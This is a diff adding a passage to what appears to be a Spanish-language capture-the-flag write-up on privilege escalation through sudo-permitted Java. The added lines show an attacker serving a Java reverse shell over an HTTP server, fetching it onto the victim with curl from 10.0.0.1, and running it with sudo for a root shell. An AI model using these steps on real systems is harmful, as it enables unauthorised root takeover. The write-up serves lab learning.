@@ -153,4 +153,16 @@ Se descubrió que la shell permitía ejecutar **Java** como root.
 
 ![SudoJava](https://i.imgur.com/nnztH1C.png)
 
----
+Lo ideal sería aplicar una reverse shell ejecutada con sudo para optener los permisos de root, se consultó [reveshells]() para generar una donde se pueda acceder mediante sudo.
+
+![SudoJava](https://i.imgur.com/3RroNqA.png)
+
+**Nota**: Se tuvo en cuenta que no había una terminal interactiva en la máquina victima por lo que exportar TERM sería una opción sin embargo, en este caso se creó la shell desde máquina atacante y en la raiz del proyecto se ejecutó un `python3 -m http.server PORT` para servir el archivo.
+
+Luego se obtuvo desde la máquina victima con `curl -O http://10.0.0.1:PORT/magic_shell.java`
+
+Con la shell en la máquina victima se ejecutó con `sudo java magic_shell.java` y a pesar de generar warnings, se obtuvo la shell con el mítico _root_
+
+![SudoJava](https://i.imgur.com/lgH3sZ1.png)
+
+## ![SudoJava](https://i.imgur.com/wVFMqtT.png)
